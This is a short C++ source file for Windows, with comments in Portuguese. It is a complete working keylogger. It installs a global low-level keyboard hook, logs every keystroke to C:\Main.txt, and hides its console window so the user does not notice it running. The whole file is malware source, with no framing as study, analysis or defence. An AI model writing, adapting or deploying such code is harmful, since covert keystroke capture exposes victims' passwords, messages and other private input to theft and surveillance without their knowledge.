#include <iostream>
#include <fstream>
#include <windows.h>

using namespace std;

LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam)
{
    if (code == HC_ACTION && wParam == WM_KEYDOWN)
    {
        KBDLLHOOKSTRUCT* pKeyboardStruct = (KBDLLHOOKSTRUCT*)lParam;
        DWORD keyCode = pKeyboardStruct->vkCode;

        ofstream arquivo;
        arquivo.open("C:\\Main.txt", ios::app);
        arquivo << static_cast<char>(keyCode); // Grava o código da tecla como caractere
        arquivo.close();
    }
    return CallNextHookEx(NULL, code, wParam, lParam);
}

int main()
{
    // Oculta a janela de console
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);

    HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (keyboardHook == NULL)
    {
        cout << "Falha ao instalar o gancho de teclado." << endl;
        return 1;
    }

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) > 0)
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(keyboardHook);
    return 0;
}
